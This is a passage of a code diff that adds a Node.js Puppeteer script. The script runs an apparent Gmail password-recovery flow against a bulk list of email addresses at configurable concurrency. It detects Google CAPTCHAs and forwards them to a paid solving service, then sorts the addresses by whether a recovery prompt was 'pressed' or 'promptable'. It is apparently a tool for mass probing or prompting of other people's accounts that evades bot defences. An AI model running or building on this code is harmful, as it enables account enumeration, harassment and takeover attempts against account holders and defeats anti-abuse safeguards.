+    await browser.close();
+    console.log('Browser closed.');
+  }
+}
+
+// Helper function to check if the current page is a CAPTCHA page
+async function checkForCaptcha(page) {
+  // Only run detailed CAPTCHA detection after email input page
+  // This is determined by checking if we're past the initial email input page
+  const url = page.url();
+  const isPastEmailPage = url.includes('/challenge/') || url.includes('/pwd/') || url.includes('/signin/v2/challenge/');
+  
+  if (!isPastEmailPage) {
+    // We're still on the initial email page, no need for detailed CAPTCHA check
+    return false;
+  }
+  
+  console.log('\n==============================================');
+  console.log('RUNNING POST-EMAIL CAPTCHA DETECTION CHECK');
+  console.log('Current URL:', url);
+  console.log('==============================================\n');
+  
+  try {
+    // First check the URL for CAPTCHA indicators
+    if (url.includes('/Captcha') || 
+        url.includes('accounts.google.com/v3/signin/challenge/captcha') || 
+        url.includes('accounts.google.com/signin/v2/challenge/captcha')) {
+      console.log('\n==============================================');
+      console.log('CAPTCHA NEEDED - DETECTED VIA URL: ' + url);
+      console.log('==============================================\n');
+      await page.screenshot({ path: 'captcha-url-detected.png' });
+      return true;
+    }
+    
+    // NEW: Check page sources for CAPTCHA images
+    console.log('Checking page sources for CAPTCHA...');
+    const captchaInSources = await page.evaluate(() => {
+      // Get all image sources from the page
+      const allImages = Array.from(document.querySelectorAll('img'));
+      const allImageSources = allImages.map(img => img.src || '');
+      
+      // Check for CAPTCHA in image sources
+      const captchaSourcePatterns = [
+        'accounts.google.com/Captcha',
+        '/Captcha',
+        'captcha',
+        'CAPTCHA'
+      ];
+      
+      // Find any image source that contains CAPTCHA patterns
+      for (const src of allImageSources) {
+        for (const pattern of captchaSourcePatterns) {
+          if (src.includes(pattern)) {
+            return {
+              detected: true,
+              method: 'source_image',
+              src: src
+            };
+          }
+        }
+      }
+      
+      // Check the entire HTML source for CAPTCHA references
+      const htmlSource = document.documentElement.outerHTML;
+      for (const pattern of captchaSourcePatterns) {
+        if (htmlSource.includes(pattern)) {
+          return {
+            detected: true,
+            method: 'html_source',
+            pattern: pattern
+          };
+        }
+      }
+      
+      return { detected: false };
+    });
+    
+    if (captchaInSources.detected) {
+      console.log('\n==============================================');
+      console.log('CAPTCHA NEEDED - DETECTED IN PAGE SOURCES');
+      console.log(`DETECTION METHOD: ${captchaInSources.method.toUpperCase()}`);
+      if (captchaInSources.src) {
+        console.log(`CAPTCHA SOURCE: ${captchaInSources.src}`);
+      } else if (captchaInSources.pattern) {
+        console.log(`CAPTCHA PATTERN FOUND: ${captchaInSources.pattern}`);
+      }
+      console.log('==============================================\n');
+      await page.screenshot({ path: path.join(screenshotsDir, `captcha-source-detected-${timestamp}.png`) });
+      return true;
+    }
+    
+    // Then check page content for CAPTCHA indicators with priority on specific elements
+    const captchaDetected = await page.evaluate(() => {
+      // First, check for the exact CAPTCHA image element that appears after email input
+      const exactCaptchaImg = document.querySelector('img[id="captchaimg"][alt="CAPTCHA image of text used to distinguish humans from robots"]');
+      if (exactCaptchaImg) {
+        return { 
+          detected: true, 
+          method: 'exact_match', 
+          selector: 'img[id="captchaimg"][alt="CAPTCHA image of text used to distinguish humans from robots"]',
+          src: exactCaptchaImg.src || 'unknown'
+        };
+      }
+      
+      // Check for various CAPTCHA image elements as fallback
+      const captchaSelectors = [
+        'img[id="captchaimg"]',
+        'img[alt*="CAPTCHA"]',
+        'img[src*="Captcha"]',
+        'img[src*="captcha"]',
+        'div[aria-label*="captcha"]',
+        'div[aria-label*="CAPTCHA"]',
+        'div[data-captcha]',
+        'iframe[title*="recaptcha"]',
+        'iframe[src*="recaptcha"]',
+        'div.g-recaptcha'
+      ];
+      
+      for (const selector of captchaSelectors) {
+        const element = document.querySelector(selector);
+        if (element) {
+          return { 
+            detected: true, 
+            method: 'element', 
+            selector,
+            src: element.tagName === 'IMG' ? (element.src || 'unknown') : 'not-image'
+          };
+        }
+      }
+      
+      // Check for text content that indicates CAPTCHA
+      const captchaTextPatterns = ['captcha', 'CAPTCHA', 'robot', 'human verification', 'security check'];
+      const textElements = document.querySelectorAll('h1, h2, h3, p, div, span, label');
+      
+      for (const element of textElements) {
+        const text = element.textContent || '';
+        for (const pattern of captchaTextPatterns) {
+          if (text.toLowerCase().includes(pattern.toLowerCase())) {
+            return { detected: true, method: 'text', text };
+          }
+        }
+      }
+      
+      // Check for input field that's typically used for CAPTCHA entry
+      const captchaInput = document.querySelector('input[aria-label="Type the text you hear or see"]');
+      if (captchaInput) {
+        return { detected: true, method: 'input_field', selector: 'input[aria-label="Type the text you hear or see"]' };
+      }
+      
+      return { detected: false };
+    });
+    
+    if (captchaDetected.detected) {
+      console.log('\n==============================================');
+      console.log('CAPTCHA NEEDED');
+      console.log(`DETECTION METHOD: ${captchaDetected.method.toUpperCase()}`);
+      
+      if (captchaDetected.method === 'exact_match') {
+        console.log('EXACT CAPTCHA IMAGE MATCH FOUND!');
+        console.log(`Image source: ${captchaDetected.src}`);
+      } else if (captchaDetected.method === 'element') {
+        console.log(`CAPTCHA element found with selector: ${captchaDetected.selector}`);
+        if (captchaDetected.src) {
+          console.log(`Image source: ${captchaDetected.src}`);
+        }
+      } else if (captchaDetected.method === 'text') {
+        console.log(`CAPTCHA text found: "${captchaDetected.text}"`);
+      } else if (captchaDetected.method === 'input_field') {
+        console.log('CAPTCHA input field found - CAPTCHA is likely present');
+      }
+      
+      console.log('==============================================\n');
+      await page.screenshot({ path: path.join(screenshotsDir, `captcha-detected-${timestamp}.png`) });
+      return true;
+    }
+    
+    console.log('No CAPTCHA detected on post-email page');
+    return false;
+  } catch (error) {
+    console.error('Error during CAPTCHA detection:', error);
+    return false;
+  }
+}
+
+// Helper function for solving captchas
+async function solveCaptchaWithCapSolver(imageBase64, apiKey) {
+  console.log('CAPTCHA SOLVING: PREPARING TO SEND TO API');
+  console.log('==============================================');
+  
+  try {
+    const response = await axios.post('https://api.capsolver.com/createTask', {
+      clientKey: apiKey,
+      task: {
+        type: 'ImageToTextTask',
+        body: imageBase64,
+        recognizingThreshold: 40,
+        case: true,  // Consider case sensitivity
+        numeric: 0,   // Any characters
+        math: false   // Not a math CAPTCHA
+      }
+    });
+    
+    console.log('CAPTCHA SOLVING: API REQUEST SENT SUCCESSFULLY');
+    
+    if (response.data && response.data.taskId) {
+      const taskId = response.data.taskId;
+      console.log('CAPTCHA SOLVING: TASK CREATED WITH ID:', taskId);
+      
+      // Poll for the result
+      let attempts = 0;
+      const maxAttempts = 10;
+      const pollInterval = 2000; // 2 seconds
+      
+      while (attempts < maxAttempts) {
+        console.log(`CAPTCHA SOLVING: POLLING FOR RESULT (Attempt ${attempts + 1}/${maxAttempts})...`);
+        
+        const resultResponse = await axios.post('https://api.capsolver.com/getTaskResult', {
+          clientKey: apiKey,
+          taskId: taskId
+        });
+        
+        if (resultResponse.data && resultResponse.data.status === 'ready') {
+          console.log('CAPTCHA SOLVING: SOLUTION READY!');
+          if (resultResponse.data.solution && resultResponse.data.solution.text) {
+            const captchaText = resultResponse.data.solution.text;
+            console.log('CAPTCHA SOLUTION:', captchaText);
+            return captchaText;
+          } else {
+            console.error('CAPTCHA SOLVING: SOLUTION OBJECT MISSING TEXT PROPERTY');
+            break;
+          }
+        } else if (resultResponse.data && resultResponse.data.status === 'processing') {
+          console.log('CAPTCHA SOLVING: STILL PROCESSING...');
+          await new Promise(resolve => setTimeout(resolve, pollInterval));
+          attempts++;
+        } else {
+          console.error('CAPTCHA SOLVING: UNEXPECTED STATUS:', resultResponse.data?.status);
+          break;
+        }
+      }
+      
+      if (attempts >= maxAttempts) {
+        console.error('CAPTCHA SOLVING: MAXIMUM POLLING ATTEMPTS REACHED');
+      }
+    } else {
+      console.error('CAPTCHA SOLVING: NO TASK ID RETURNED');
+    }
+  } catch (error) {
+    console.error('CAPTCHA SOLVING: API ERROR:', error.message);
+  }
+  
+  return null; // Return null if solving failed
+}
+
+/**
+ * Setup logging for a specific email
+ * Creates necessary directories and redirects console output to a log file
+ */
+function setupLoggingForEmail(email) {
+  // Create timestamp for log file name (e.g., Apr26-1623 for April 26 4:23 PM)
+  const now = new Date();
+  const month = now.toLocaleString('en-US', { month: 'short' });
+  const day = now.getDate().toString().padStart(2, '0');
+  const hours = now.getHours().toString().padStart(2, '0');
+  const minutes = now.getMinutes().toString().padStart(2, '0');
+  const timestamp = `${month}${day}-${hours}${minutes}`;
+  
+  // Create directory structure for debug logs
+  const emailDir = path.join(__dirname, 'debug-logs', email);
+  const screenshotsDir = path.join(emailDir, 'screenshots');
+  const htmlPagesDir = path.join(emailDir, 'html-pages');
+  const consoleDir = path.join(emailDir, 'console');
+  
+  // Create directories if they don't exist
+  [emailDir, screenshotsDir, htmlPagesDir, consoleDir].forEach(dir => {
+    if (!fs.existsSync(dir)) {
+      fs.mkdirSync(dir, { recursive: true });
+    }
+  });
+  
+  // Create log file path
+  const logFilePath = path.join(consoleDir, `${timestamp}.txt`);
+  
+  // Create write stream for log file
+  const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
+  
+  // Override console.log and console.error to write to log file
+  console.log = function(...args) {
+    const logMessage = `[${new Date().toISOString()}] ${args.join(' ')}`;
+    logStream.write(logMessage + '\n');
+    originalConsoleLog.apply(console, args);
+  };
+  
+  console.error = function(...args) {
+    const errorMessage = `[${new Date().toISOString()}] ERROR: ${args.join(' ')}`;
+    logStream.write(errorMessage + '\n');
+    originalConsoleError.apply(console, args);
+  };
+  
+  // Return the directories for use in the main function
+  return {
+    screenshotsDir,
+    htmlPagesDir,
+    consoleDir,
+    logFilePath
+  };
+}
+
+/**
+ * Read concurrency setting from config file
+ */
+function readConcurrencyConfig() {
+  const configPath = path.join(__dirname, 'configs', 'concurrency.conf');
+  let concurrency = 1; // Default value
+  
+  try {
+    if (fs.existsSync(configPath)) {
+      const configContent = fs.readFileSync(configPath, 'utf-8');
+      const match = configContent.match(/concurrency\s*=\s*(\d+)/);
+      
+      if (match && match[1]) {
+        concurrency = parseInt(match[1], 10);
+        if (isNaN(concurrency) || concurrency < 1) {
+          console.log('Invalid concurrency value in config, using default value of 1');
+          concurrency = 1;
+        } else {
+          console.log(`Using concurrency value from config: ${concurrency}`);
+        }
+      } else {
+        console.log('Concurrency value not found in config, using default value of 1');
+      }
+    } else {
+      console.log('Concurrency config file not found, using default value of 1');
+    }
+  } catch (error) {
+    console.error('Error reading concurrency config:', error.message);
+  }
+  
+  return concurrency;
+}
+
+/**
+ * Read emails from input file
+ */
+function readEmailsFromInputFile() {
+  const inputFilePath = path.join(__dirname, 'mails', 'input', 'input.txt');
+  let emails = [];
+  
+  try {
+    if (fs.existsSync(inputFilePath)) {
+      const fileContent = fs.readFileSync(inputFilePath, 'utf-8');
+      emails = fileContent.split('\n')
+        .map(line => line.trim())
+        .filter(line => line && line.includes('@')); // Basic validation for email format
+      
+      console.log(`Read ${emails.length} emails from input file`);
+    } else {
+      console.error('Input file not found:', inputFilePath);
+    }
+  } catch (error) {
+    console.error('Error reading input file:', error.message);
+  }
+  
+  return emails;
+}
+
+/**
+ * Save email to appropriate output file based on result
+ */
+function saveEmailToOutput(email, result) {
+  let outputDir;
+  
+  if (result === 'pressed') {
+    outputDir = path.join(__dirname, 'mails', 'output', 'pressed');
+  } else if (result === 'unpromptable') {
+    outputDir = path.join(__dirname, 'mails', 'output', 'unpromtable');
+  } else if (result === 'promptable-nopress') {
+    outputDir = path.join(__dirname, 'mails', 'output', 'promptable-nopress');
+  } else {
+    console.error('Invalid result type:', result);
+    return;
+  }
+  
+  // Create directory if it doesn't exist
+  if (!fs.existsSync(outputDir)) {
+    fs.mkdirSync(outputDir, { recursive: true });
+  }
+  
+  const outputFilePath = path.join(outputDir, 'output.txt');
+  
+  try {
+    fs.appendFileSync(outputFilePath, email + '\n');
+    console.log(`Email ${email} saved to ${outputFilePath}`);
+  } catch (error) {
+    console.error(`Error saving email to output file:`, error.message);
+  }
+}
+
+/**
+ * Main function to process emails with concurrency
+ */
+async function processEmails() {
+  console.log('Starting Gmail password recovery process...');
+  
+  // Read concurrency setting from config
+  const concurrency = readConcurrencyConfig();
+  
+  // Read emails from input file
+  const emails = readEmailsFromInputFile();
+  
+  if (emails.length === 0) {
+    console.log('No emails to process. Please add emails to the input file.');
+    return;
+  }
+  
+  console.log(`Processing ${emails.length} emails with concurrency ${concurrency}`);
+  
+  // Process emails with concurrency
+  const chunks = [];
+  for (let i = 0; i < emails.length; i += concurrency) {
+    chunks.push(emails.slice(i, i + concurrency));
+  }
+  
+  for (const chunk of chunks) {
+    // Process each chunk of emails concurrently
+    await Promise.all(chunk.map(async (email) => {
+      try {
+        // Setup logging for this email
+        const logDirs = setupLoggingForEmail(email);
+        
+        // Run the password recovery process
+        const result = await runGmailPasswordRecovery(email);
+        
+        // Save email to appropriate output file based on result
+        saveEmailToOutput(email, result);
+      } catch (error) {
+        console.error(`Error processing email ${email}:`, error.message);
+      }
+    }));
+  }
+  
+  console.log('All emails processed.');
+}
+
+// Start the process
+processEmails();
